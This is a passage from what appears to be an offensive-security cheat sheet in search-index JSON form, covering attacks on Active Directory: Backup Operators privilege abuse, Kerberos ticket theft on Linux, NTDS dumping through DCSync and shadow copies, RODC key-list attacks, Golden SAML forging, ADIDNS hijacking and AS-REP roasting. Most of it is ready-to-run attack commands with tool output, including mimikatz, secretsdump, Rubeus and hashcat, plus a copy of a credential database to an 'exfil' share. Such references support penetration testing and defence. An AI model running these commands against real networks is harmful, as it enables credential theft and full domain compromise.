schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.</p>"},{"location":"active-directory/ad-adds-groups/#backup-operators-group","title":"Backup Operators Group","text":"<p>Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.</p> <p>This groups grants the following privileges : - SeBackup privileges - SeRestore privileges</p> <ul> <li>Get members of the group:</li> <li>Windows/Linux:     <pre><code>bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object \"Backup Operators\" --attr msds-memberTransitive\n</code></pre></li> <li>Windows only:     <pre><code>PowerView&gt; Get-NetGroupMember -Identity \"Backup Operators\" -Recurse\n</code></pre></li> <li>Enable privileges using giuliano108/SeBackupPrivilege <pre><code>Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\n\nSet-SeBackupPrivilege\nGet-SeBackupPrivilege\n</code></pre></li> <li>Retrieve sensitive files   <pre><code>Copy-FileSeBackupPrivilege C:\\Users\\Administrator\\flag.txt C:\\Users\\Public\\flag.txt -Overwrite\n</code></pre></li> <li>Retrieve content of AutoLogon in the HKLM\\SOFTWARE hive   <pre><code>$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)\n$winlogon = $reg.OpenSubKey('SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon')\n$winlogon.GetValueNames() | foreach {\"$_ : $(($winlogon).GetValue($_))\"}\n</code></pre></li> <li>Retrieve SAM,SECURITY and SYSTEM hives</li> <li>mpgn/BackupOperatorToDA: <code>.\\BackupOperatorToDA.exe -t \\\\dc1.lab.local -u user -p pass -d domain -o \\\\10.10.10.10\\SHARE\\</code></li> <li>improsec/BackupOperatorToolkit: <code>.\\BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK</code></li> </ul>"},{"location":"active-directory/ad-adds-groups/#references","title":"References","text":"<ul> <li>Poc\u2019ing Beyond Domain Admin - Part 1 - cube0x0</li> <li>WHAT\u2019S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</li> </ul>"},{"location":"active-directory/ad-adds-linux/","title":"Active Directory - Linux","text":""},{"location":"active-directory/ad-adds-linux/#ccache-ticket-reuse-from-tmp","title":"CCACHE ticket reuse from /tmp","text":"<p>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions</p> <p>List the current ticket used for authentication with <code>env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code>export KRB5CCNAME=/tmp/ticket.ccache</code>. Kerberos ticket name format is <code>krb5cc_%{uid}</code> where uid is the user UID. </p> <pre><code>$ ls /tmp/ | grep krb5cc\nkrb5cc_1000\nkrb5cc_1569901113\nkrb5cc_1569901115\n\n$ export KRB5CCNAME=/tmp/krb5cc_1569901115\n</code></pre>"},{"location":"active-directory/ad-adds-linux/#ccache-ticket-reuse-from-keyring","title":"CCACHE ticket reuse from keyring","text":"<p>Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey</p> <pre><code># Configuration and build\ngit clone https://github.com/TarlogicSecurity/tickey\ncd tickey/tickey\nmake CONF=Release\n\n[root@Lab-LSV01 /]# /tmp/tickey -i\n[*] krb5 ccache_name = KEYRING:session:sess_%{uid}\n[+] root detected, so... DUMP ALL THE TICKETS!!\n[*] Trying to inject in tarlogic[1000] session...\n[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache\n[*] Trying to inject in velociraptor[1120601115] session...\n[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache\n[*] Trying to inject in trex[1120601113] session...\n[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache\n[X] [uid:0] Error retrieving tickets\n</code></pre>"},{"location":"active-directory/ad-adds-linux/#ccache-ticket-reuse-from-sssd-kcm","title":"CCACHE ticket reuse from SSSD KCM","text":"<p>SSSD maintains a copy of the database at the path <code>/var/lib/sss/secrets/secrets.ldb</code>.  The corresponding key is stored as a hidden file at the path <code>/var/lib/sss/secrets/.secrets.mkey</code>.  By default, the key is only readable if you have root permissions.</p> <p>Invoking <code>SSSDKCMExtractor</code> with the --database and --key parameters will parse the database and decrypt the secrets.</p> <pre><code>git clone https://github.com/fireeye/SSSDKCMExtractor\npython3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey\n</code></pre> <p>The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.</p>"},{"location":"active-directory/ad-adds-linux/#ccache-ticket-reuse-from-keytab","title":"CCACHE ticket reuse from keytab","text":"<pre><code>git clone https://github.com/its-a-feature/KeytabParser\npython KeytabParser.py /etc/krb5.keytab\nklist -k /etc/krb5.keytab\n</code></pre>"},{"location":"active-directory/ad-adds-linux/#extract-accounts-from-etckrb5keytab","title":"Extract accounts from /etc/krb5.keytab","text":"<p>The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. </p> <p>Use <code>klist</code> to read the keytab file and parse its content. The key that you see when the key type is 23  is the actual NT Hash of the user.</p> <pre><code>$ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab\n[...]\n[26] Service principal: host/COMPUTER@DOMAIN\n     KVNO: 25\n     Key type: 23\n     Key: 31d6cfe0d16ae931b73c59d7e0c089c0\n     Time stamp: Oct 07,  2019 09:12:02\n[...]\n</code></pre> <p>On Linux you can use <code>KeyTabExtract</code>: we want RC4 HMAC hash to reuse the NLTM hash.</p> <pre><code>$ python3 keytabextract.py krb5.keytab \n[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck\n[+] Keytab File successfully imported.\n        REALM : DOMAIN\n        SERVICE PRINCIPAL : host/computer.domain\n        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky\n</code></pre> <p>On macOS you can use <code>bifrost</code>.</p> <pre><code>./bifrost -action dump -source keytab -path test\n</code></pre> <p>Connect to the machine using the account and the hash with CME.</p> <pre><code>$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H \"31d6cfe0d16ae931b73c59d7e0c089c0\" -d \"DOMAIN\"\nCME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  \n</code></pre>"},{"location":"active-directory/ad-adds-linux/#extract-accounts-from-etcsssdsssdconf","title":"Extract accounts from /etc/sssd/sssd.conf","text":"<p>sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf</p> <p>The obfuscated password is put into \"ldap_default_authtok\" parameter of a given SSSD domain and the \"ldap_default_authtok_type\" parameter is set to \"obfuscated_password\". </p> <pre><code>[sssd]\nconfig_file_version = 2\n...\n[domain/LDAP]\n...\nldap_uri = ldap://127.0.0.1\nldap_search_base = ou=People,dc=srv,dc=world\nldap_default_authtok_type = obfuscated_password\nldap_default_authtok = [BASE64_ENCODED_TOKEN]\n</code></pre> <p>De-obfuscate the content of the ldap_default_authtok variable with mludvig/sss_deobfuscate</p> <pre><code>./sss_deobfuscate [ldap_default_authtok_base64_encoded]\n./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID\n</code></pre>"},{"location":"active-directory/ad-adds-linux/#references","title":"References","text":"<ul> <li>Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell</li> <li>All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</li> </ul>"},{"location":"active-directory/ad-adds-ntds-dumping/","title":"Active Directory - NTDS Dumping","text":"<p>You will need the following files to extract the ntds :  - NTDS.dit file - SYSTEM hive (<code>C:\\Windows\\System32\\SYSTEM</code>)</p> <p>Usually you can find the ntds in two locations : <code>systemroot\\NTDS\\ntds.dit</code> and <code>systemroot\\System32\\ntds.dit</code>.</p> <ul> <li><code>systemroot\\NTDS\\ntds.dit</code> stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).</li> <li><code>systemroot\\System32\\ntds.dit</code> is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.</li> </ul> <p>However you can change the location to a custom one, you will need to query the registry to get the current location.</p> <pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\"\n</code></pre>"},{"location":"active-directory/ad-adds-ntds-dumping/#dcsync-attack","title":"DCSync Attack","text":"<p>DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. </p> <ul> <li>DCSync only one user   <pre><code>mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt\n</code></pre></li> <li>DCSync all users of the domain   <pre><code>mimikatz# lsadump::dcsync /domain:htb.local /all /csv\n\ncrackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds\ncrackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi\n</code></pre></li> </ul> <p> OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.</p>"},{"location":"active-directory/ad-adds-ntds-dumping/#volume-shadow-copy","title":"Volume Shadow Copy","text":"<p>The VSS is a Windows service that allows users to create snapshots or backups of their data at a specific point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used or locked by another process.</p> <ul> <li>windows-commands/vssadmin <pre><code>vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy\n</code></pre></li> <li>windows-commands/ntdsutil <pre><code>ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q\n</code></pre></li> <li>CrackMapExec VSS module <pre><code>cme smb 10.10.0.202 -u username -p password --ntds vss\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-ntds-dumping/#extract-hashes-from-ntdsdit","title":"Extract hashes from ntds.dit","text":"<p>then you need to use secretsdump to extract the hashes, use the <code>LOCAL</code> options to use it on a retrieved ntds.dit</p> <pre><code>secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL\n</code></pre> <p>secretsdump also works remotely</p> <pre><code>./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status \n./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1\n</code></pre> <ul> <li><code>-pwd-last-set</code>: Shows pwdLastSet attribute for each NTDS.DIT account.</li> <li><code>-user-status</code>: Display whether or not the user is disabled.</li> </ul>"},{"location":"active-directory/ad-adds-ntds-dumping/#extract-hashes-from-adamntdsdit","title":"Extract hashes from adamntds.dit","text":"<p>In AD LDS stores the data inside a dit file located at <code>C:\\Program Files\\Microsoft ADAM\\instance1\\data\\adamntds.dit</code>.</p> <ul> <li> <p>Dump adamntds.dit with Shadow copy using <code>vssadmin.exe</code> <pre><code>vssadmin.exe create shadow /For=C:\ncp \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Program files\\Microsoft ADAM\\instance1\\data\\adamntds.dit\" \\\\exfil\\data\\adamntds.dit\n</code></pre></p> </li> <li> <p>Dump adamntds.dit with Windows Server Backup using <code>wbadmin.exe</code> <pre><code>wbadmin.exe start backup -backupTarget:e: -vssCopy -include:\"C:\\Program Files\\Microsoft ADAM\\instance1\\data\\adamntds.dit\"\nwbadmin.exe start recovery -version:08/04/2023-12:59 -items:\"c:\\Program Files\\Microsoft ADAM\\instance1\\data\\adamntds.dit\" -itemType:File -recoveryTarget:C:\\Users\\Administrator\\Desktop\\ -backupTarget:e:\n</code></pre></p> </li> <li> <p>Extract hashes with synacktiv/ntdissector <pre><code>ntdissector path/to/adamntds.dit\npython ntdissector/tools/user_to_secretsdump.py path/to/output/*.json\n</code></pre></p> </li> </ul>"},{"location":"active-directory/ad-adds-ntds-dumping/#crack-ntlm-hashes-with-hashcat","title":"Crack NTLM hashes with hashcat","text":"<p>Useful when you want to have the clear text password or when you need to make stats about weak passwords.</p> <p>Recommended wordlists: - Rockyou.txt - Have I Been Pwned founds - Weakpass.com - Read More at Methodology and Resources/Hash Cracking.md</p> <pre><code># Basic wordlist\n# (-O) will Optimize for 32 characters or less passwords\n# (-w 4) will set the workload to \"Insane\" \n$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2\n\n# Generate a custom mask based on a wordlist\n$ git clone https://github.com/iphelix/pack/blob/master/README\n$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask\n$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask\n</code></pre> <p> If the password is not a confidential data (challenges/ctf), you can use online \"cracker\" like :</p> <ul> <li>hashmob.net</li> <li>crackstation.net</li> <li>hashes.com</li> </ul>"},{"location":"active-directory/ad-adds-ntds-dumping/#ntds-reversible-encryption","title":"NTDS Reversible Encryption","text":"<p><code>UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED</code> (0x00000080), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.</p> <p>The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin. This means the hashes can be trivially reversed to the cleartext values, hence the term \u201creversible encryption\u201d.</p> <ul> <li>List users with \"Store passwords using reversible encryption\" enabled     <pre><code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre></li> </ul> <p>The password retrieval is already handled by SecureAuthCorp/secretsdump.py and mimikatz, it will be displayed as CLEARTEXT. </p>"},{"location":"active-directory/ad-adds-ntds-dumping/#extract-hashes-from-memory","title":"Extract hashes from memory","text":"<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.</p> <p> Requires administrator access with debug privilege or NT-AUTHORITY\\SYSTEM account.</p> <pre><code>mimikatz&gt; privilege::debug\nmimikatz&gt; sekurlsa::krbtgt\nmimikatz&gt; lsadump::lsa /inject /name:krbtgt\n</code></pre>"},{"location":"active-directory/ad-adds-ntds-dumping/#references","title":"References","text":"<ul> <li>Diskshadow The Return Of VSS Evasion Persistence And AD Db Extraction - bohops - March 26, 2018</li> <li>Dumping Domain Password Hashes - Pentestlab - July 4, 2018</li> <li>Using Ntdissector To Extract Secrets From Adam Ntds Files - Julien Legras, Mehdi Elyassa - 06/12/2023</li> </ul>"},{"location":"active-directory/ad-adds-rodc/","title":"Active Directory - Read Only Domain Controller","text":"<p>RODCs are an alternative for Domain Controllers in less secure physical locations - Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded) - Any user or group specified in the managedBy attribute of an RODC has local admin access to the RODC server</p>"},{"location":"active-directory/ad-adds-rodc/#rodc-golden-ticket","title":"RODC Golden Ticket","text":"<ul> <li>You can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC\u2019s msDS-RevealOnDemandGroup attribute and not in the RODC\u2019s msDS-NeverRevealGroup attribute</li> </ul>"},{"location":"active-directory/ad-adds-rodc/#rodc-key-list-attack","title":"RODC Key List Attack","text":"<p>Requirements:</p> <ul> <li>Impacket PR #1210 - The Kerberos Key List Attack</li> <li>krbtgt credentials of the RODC (-rodcKey) </li> <li>ID of the krbtgt account of the RODC (-rodcNo)</li> </ul> <p>Exploit:</p> <ul> <li>using Impacket   <pre><code># keylistattack.py using SAMR user enumeration without filtering (-full flag)\nkeylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full\n\n# keylistattack.py defining a target username (-t flag)\nkeylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST\n\n# secretsdump.py using the Kerberos Key List Attack option (-use-keylist)\nsecretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist\n</code></pre></li> <li>Using Rubeus   <pre><code>Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871\nRubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-rodc/#rodc-computer-object","title":"RODC Computer Object","text":"<p>When you have one the following permissions to the RODC computer object: GenericWrite, GenericAll, WriteDacl, Owns, WriteOwner, WriteProperty.</p> <ul> <li>Add a domain admin account to the RODC's msDS-RevealOnDemandGroup attribute</li> <li>Windows/Linux:     <pre><code># Get original msDS-RevealOnDemandGroup values \nbloodyAD --host 10.10.10.10 -d domain.local -u username -p pass123 get object 'RODC$' --attr msDS-RevealOnDemandGroup\ndistinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local\nmsDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local\n# Add the previous value plus the admin account\nbloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 set object 'RODC$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'\n</code></pre></li> <li>Windows only:   <pre><code>PowerSploit&gt; Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-rodc/#references","title":"References","text":"<ul> <li>Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf</li> <li>At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir</li> <li>The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</li> </ul>"},{"location":"active-directory/ad-adfs-federation-services/","title":"Active Directory - Federation Services","text":""},{"location":"active-directory/ad-adfs-federation-services/#adfs-golden-saml","title":"ADFS - Golden SAML","text":"<p>Requirements:</p> <ul> <li>ADFS service account</li> <li>The private key (PFX with the decryption password)</li> </ul> <p>Exploitation:</p> <ul> <li>Run mandiant/ADFSDump on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): <code>\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query</code></li> <li>Convert PFX and Private Key to binary format     <pre><code># For the pfx\necho AAAAAQAAAAAEE[...]Qla6 | base64 -d &gt; EncryptedPfx.bin\n# For the private key\necho f7404c7f[...]aabd8b | xxd -r -p &gt; dkmKey.bin \n</code></pre></li> <li>Create the Golden SAML using mandiant/ADFSpoof, you might need to update the dependencies.     <pre><code>mkdir ADFSpoofTools\ncd $_\ngit clone https://github.com/dmb2168/cryptography.git\ngit clone https://github.com/mandiant/ADFSpoof.git \nvirtualenv3 venvADFSSpoof\nsource venvADFSSpoof/bin/activate\npip install lxml\npip install signxml\npip uninstall -y cryptography\ncd cryptography\npip install -e .\ncd ../ADFSpoof\npip install -r requirements.txt\npython ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls\n/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '&lt;Attribute Name=\"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname\"&gt;&lt;AttributeValue&gt;PENTEST\\administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;'\n</code></pre></li> </ul> <p>Other interesting tools to exploit AD FS: </p> <ul> <li>secureworks/whiskeysamlandfriends/WhiskeySAML - Proof of concept for a Golden SAML attack with Remote ADFS Configuration Extraction.</li> </ul>"},{"location":"active-directory/ad-adfs-federation-services/#references","title":"References","text":"<ul> <li>I AM AD FS AND SO CAN YOU - Douglas Bienstock &amp; Austin Baker - Mandiant</li> </ul>"},{"location":"active-directory/ad-integrated-dns/","title":"Active Directory - Integrated DNS - ADIDNS","text":"<p>ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.</p> <ul> <li>Enumerate all records     <pre><code>adidnsdump -u DOMAIN\\\\user --print-zones dc.domain.corp (--dns-tcp)\n# or\nbloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 get dnsDump\n</code></pre></li> <li>Query a node     <pre><code>dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action query $DomainController (--legacy)\n# or\nbloodyAD -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'DC=DomainDnsZones,DC=bloody,DC=lab' --filter '(&amp;(name=allmightyDC)(objectClass=dnsNode))' --attr dnsRecord\n</code></pre></li> <li>Add a node and attach a record     <pre><code>dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController\n# or\nbloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 add dnsRecord dc1.example.lab &lt;Attacker IP&gt;\n\nbloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 remove dnsRecord dc1.example.lab &lt;Attacker IP&gt;\n</code></pre></li> </ul> <p>The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.</p> <pre><code>Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y\n</code></pre>"},{"location":"active-directory/ad-integrated-dns/#dns-reconnaissance","title":"DNS Reconnaissance","text":"<p>Perform ADIDNS searches</p> <pre><code>StandIn.exe --dns --limit 20\nStandIn.exe --dns --filter SQL --limit 10\nStandIn.exe --dns --forest --domain &lt;domain&gt; --user &lt;username&gt; --pass &lt;password&gt;\nStandIn.exe --dns --legacy --domain &lt;domain&gt; --user &lt;username&gt; --pass &lt;password&gt;\n</code></pre>"},{"location":"active-directory/ad-integrated-dns/#references","title":"References","text":"<ul> <li>Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema</li> <li>ADIDNS Revisited \u2013 WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson</li> <li>Beyond LLMNR/NBNS Spoofing \u2013 Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson</li> </ul>"},{"location":"active-directory/ad-roasting-asrep/","title":"Roasting - ASREP Roasting","text":"<p>If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting</p> <p>Requirements:</p> <ul> <li>Accounts with the attribute DONT_REQ_PREAUTH</li> <li>Windows/Linux:     <pre><code>bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&amp;(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  \n</code></pre></li> <li> <p>Windows only:     <pre><code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n</code></pre></p> </li> <li> <p>Rubeus <pre><code>C:\\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast\n[*] Action: AS-REP roasting\n[*] Target User            : TestOU3user\n[*] Target Domain          : testlab.local\n[*] SamAccountName         : TestOU3user\n[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\n[*] Using domain controller: testlab.local (192.168.52.100)\n[*] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user'\n[*] Connecting to 192.168.52.100:88\n[*] Sent 169 bytes\n[*] Received 1437 bytes\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n$krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...\n</code></pre></p> </li> <li> <p>GetNPUsers from Impacket Suite   <pre><code>$ python GetNPUsers.py htb.local/svc-alfresco -no-pass\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4\n\n# extract hashes\nroot@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\nroot@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast\n</code></pre></p> </li> <li> <p>CrackMapExec Module   <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt\nLDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5\n</code></pre></p> </li> </ul> <p>Using <code>hashcat</code> or <code>john</code> to crack the ticket.</p> <pre><code># crack AS_REP messages with hashcat\nroot@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt \nroot@windows:hashcat$ hashcat64.exe -m 18200 '&lt;AS_REP-hash&gt;' -a 0 c:\\wordlists\\rockyou.txt\n\n# crack AS_REP messages with john\nC:\\Rubeus&gt; john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast\n</code></pre> <p>Mitigations: </p> <ul> <li>All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default).</li> </ul>"},{"location":"active-directory/ad-roasting-asrep/#kerberoasting-wo-domain-account","title":"Kerberoasting w/o domain account","text":"<p>In September 2022 a vulnerability was discovered by Charlie Clark, ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account. If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an KRB_AS_REQ request and trick the request to ask for a ST instead of a encrypted TGT, by modifying the sname attribute in the req-body part of the request.</p> <p>The technique is fully explained in this article: Semperis blog post.</p> <p> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.</p> <ul> <li>impacket/GetUserSPNs.py from PR #1413 <pre><code>GetUserSPNs.py -no-preauth \"NO_PREAUTH_USER\" -usersfile \"LIST_USERS\" -dc-host \"dc.domain.local\" \"domain.local\"/\n</code></pre></li> <li>GhostPack/Rubeus from PR #139 <pre><code>Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:\"domain.local\" /dc:\"dc.domain.local\" /nopreauth:\"NO_PREAUTH_USER\" /spn:\"TARGET_SERVICE\"\n</code></pre></li> </ul>"},{"location":"active-directory/ad-roasting-asrep/#cve-2022-33679","title":"CVE-2022-33679","text":"<p>CVE-2022-33679 performs an encryption downgrade attack by forcing the KDC to use the RC4-MD4 algorithm and then brute forcing the session key from the AS-REP using a known plaintext attack, Similar to AS-REP Roasting, it works against accounts that have pre-authentication disabled and the attack is unauthenticated meaning we don\u2019t need a client\u2019s password..</p> <p>Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html</p> <p>Requirements:</p> <ul> <li>Accounts with the attribute DONT_REQ_PREAUTH</li> <li>Windows/Linux:     <pre><code>bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&amp;(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  \n</code></pre></li> <li> <p>Windows only:     <pre><code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n</code></pre></p> </li> <li> <p>Using CVE-2022-33679.py <pre><code>user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL\nuser@hostname:~$ export KRB5CCNAME=/home/project/User.ccache\nuser@hostname:~$ crackmapexec smb DC01.DOMAIN.LOCAL -k --shares\n</code></pre></p> </li> </ul> <p>Mitigations: </p> <ul> <li>All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default).</li> <li>Disable RC4 cipher if possible.</li> </ul>"},{"location":"active-directory/ad-roasting-asrep/#references","title":"References","text":"<ul> <li>Roasting AS-REPs - January 17, 2017 - harmj0y</li> <li>Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10</li> </ul>"},{"location":"active-directory/ad-roasting-kerberoasting/","title":"Roasting - Kerberoasting","text":"<p>\"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \" - MSDN</p> <p>Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the 